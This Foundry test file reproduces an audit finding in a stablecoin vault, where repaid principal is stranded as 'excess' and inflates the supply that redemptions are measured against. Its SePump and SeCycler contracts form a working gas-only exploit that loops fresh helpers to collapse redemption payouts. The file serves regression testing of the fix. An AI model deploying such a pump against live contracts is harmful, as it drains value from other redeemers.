// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// Final vault panel audit 2026-10-08 (job 45bf3777): the panel's reproduction of the high F1 (the per-position excess of 58f73de could be stranded and pumped; the excess is removed),
// kept as written. It failed on d7fceab and passes on the fix.

// CDPVault.wipe keeps in Position.excess the principal repaid that the secured term did not follow down, and
// only `draw` (by the amount borrowed) and `free` (by the term's fall) ever release it. A second `wipe` whose
// term fall exceeds its own repayment releases nothing, so a borrower who repays a slice while its term is
// collateral-bound, then repays the rest and withdraws, leaves the slice in `_excess` with no debt and no
// collateral behind it. `_backingPerUnit` adds it to the supply for every later redemption, for hours.
// A fresh helper contract per cycle makes it a gas-only, unbounded pump on the redemption payout.

import {Test} from "forge-std/Test.sol";
import {ParameterizedVault} from "src/ParameterizedVault.sol";
import {ImdUSD} from "src/ImdUSD.sol";
import {MockIMD} from "src/MockIMD.sol";
import {TreasuryFactory} from "src/TreasuryFactory.sol";
import {ISwarmFeed} from "src/interfaces/ISwarmFeed.sol";
import {APPROVED_OPERATOR, CHAINLINK_ETH_USD, TREASURY_FACTORY} from "src/DeploymentConfig.sol";

contract SeFeed is ISwarmFeed {
    uint256 public constant maxAge = 1 days;
    uint256 private value;
    uint64 private updatedAt;

    constructor(uint256 v) {
        value = v;
        updatedAt = uint64(block.timestamp);
    }

    function set(uint256 v) external {
        value = v;
        updatedAt = uint64(block.timestamp);
    }

    function latestValue() external view returns (uint256, uint64) {
        return (value, updatedAt);
    }

    function isStale() external pure returns (bool) {
        return false;
    }
}

contract SeMirror is ISwarmFeed {
    ISwarmFeed private immutable primary;

    constructor(ISwarmFeed p) {
        primary = p;
    }

    function latestValue() external view returns (uint256, uint64) {
        return primary.latestValue();
    }

    function isStale() external view returns (bool) {
        return primary.isStale();
    }

    function maxAge() external view returns (uint256) {
        return primary.maxAge();
    }
}

contract SeAggregator {
    function decimals() external pure returns (uint8) {
        return 8;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 2000e8, block.timestamp, block.timestamp, 1);
    }
}

/// @dev One cycle: lock C, draw D at 170%, repay a slice (term unchanged: kept as excess), repay the rest
/// (term to zero: nothing released), withdraw everything. Position closed, excess stranded.
contract SeCycler {
    function run(ParameterizedVault vault, MockIMD imd, uint256 c, uint256 d, uint256 slice) external {
        imd.approve(address(vault), c);
        vault.lock(c);
        vault.draw(d);
        vault.wipe(slice);
        vault.wipe(vault.debtOf(address(this)));
        vault.free(c);
        imd.transfer(msg.sender, c);
    }
}

contract SePump {
    function run(ParameterizedVault vault, MockIMD imd, uint256 c, uint256 d, uint256 slice, uint256 n) external {
        for (uint256 i; i < n; i++) {
            SeCycler cy = new SeCycler();
            imd.transfer(address(cy), c);
            cy.run(vault, imd, c, d, slice);
        }
    }
}

contract StrandedExcessTest is Test {
    address private constant OTHER = address(0x07E);
    address private constant HOLDER = address(0x401);
    address private constant NEW = address(0x0E3);

    MockIMD private imd;
    SeFeed private primary;
    ParameterizedVault private vault;
    ImdUSD private stable;

    function usd(uint256 dollars) private pure returns (uint256) {
        return dollars / 2000; // IMD/ETH such that times Chainlink's 2000 USD/ETH it reads `dollars`
    }

    function setUp() public {
        if (TREASURY_FACTORY.code.length == 0) vm.etch(TREASURY_FACTORY, address(new TreasuryFactory()).code);
        vm.etch(CHAINLINK_ETH_USD, address(new SeAggregator()).code);
        vm.warp(1_000_000);
        imd = new MockIMD();
        primary = new SeFeed(usd(1 ether)); // IMD = $1
        SeFeed health = new SeFeed(0.85 ether); // mat 170, gap 50
        vault = new ParameterizedVault(
            address(imd), address(0), address(0), address(primary), address(health), address(new SeMirror(primary))
        );
        stable = vault.stablecoin();
        vm.startPrank(APPROVED_OPERATOR);
        imd.mint(OTHER, 100_000 ether);
        imd.mint(NEW, 100_000 ether);
        vm.stopPrank();
        vm.prank(OTHER);
        imd.approve(address(vault), type(uint256).max);
        vm.prank(NEW);
        imd.approve(address(vault), type(uint256).max);

        // OTHER: 2,000 IMD against 1,000 imdUSD, warm; IMD falls to $0.40: backing 800 / 1,000 = 0.8.
        vm.startPrank(OTHER);
        vault.lock(2_000 ether);
        vault.draw(1_000 ether);
        stable.transfer(HOLDER, 1_000 ether);
        vm.stopPrank();
        vm.warp(block.timestamp + 2 days);
        primary.set(usd(0.4 ether));
        assertEq(vault.backingPerUnit(), 0.8e18, "the book: 800 of collateral value against 1,000 imdUSD");
    }

    /// Ten fresh helpers in ONE transaction, the same 10,000 IMD reused. Afterwards the vault holds exactly
    /// OTHER's 2,000 IMD against the same 1,000 imdUSD. EXPECTED: backing 0.8 and a 100 imdUSD redemption paid
    /// about 199 IMD. ACTUAL: 3,520 of stranded excess in the supply, backing 0.177, the redemption paid 42 IMD.
    function test_aGasOnlyPumpStrandsExcessAndCollapsesTheRedemptionPayout() public {
        SePump pump = new SePump();
        vm.prank(APPROVED_OPERATOR);
        imd.mint(address(pump), 10_000 ether);
        pump.run(vault, imd, 10_000 ether, 2_352 ether, 352 ether, 10);
        vm.warp(block.timestamp + 12);
        assertEq(vault.totalDebt(), 1_000 ether, "only OTHER's debt is open");
        assertEq(imd.balanceOf(address(vault)), 2_000 ether, "only OTHER's collateral is in the vault");
        assertEq(stable.totalSupply(), 1_000 ether, "only OTHER's imdUSD exists");
        uint256 backing = vault.backingPerUnit();
        emit log_named_uint("backingPerUnit after the pump", backing);
        vm.prank(HOLDER);
        uint256 paid = vault.cash(100 ether, 0, OTHER);
        emit log_named_uint("cash(100) paid (raw IMD)", paid);
        assertGe(backing + 1e15, 0.8e18, "closed positions must leave nothing in the supply backing is measured against");
    }

    /// One honest borrower, three transactions: open at 170%, repay a slice, repay the rest and withdraw.
    /// EXPECTED: backing back at 0.8. ACTUAL: 0.59, the slice stranded in `_excess` for hours.
    function test_anHonestTwoStepUnwindStrandsItsFirstSlice() public {
        vm.startPrank(NEW);
        vault.lock(10_000 ether);
        vault.draw(2_352 ether);
        vm.stopPrank();
        vm.prank(NEW);
        vault.wipe(352 ether);
        vm.startPrank(NEW);
        vault.wipe(vault.debtOf(NEW));
        vault.free(10_000 ether);
        vm.stopPrank();
        (uint256 collateral, uint256 debt) = vault.positions(NEW);
        assertEq(collateral + debt, 0, "NEW left nothing behind");
        uint256 backing = vault.backingPerUnit();
        emit log_named_uint("backingPerUnit after the unwind", backing);
        assertGe(backing + 1e15, 0.8e18, "an honest full unwind must not lower what every redeemer is paid");
    }
}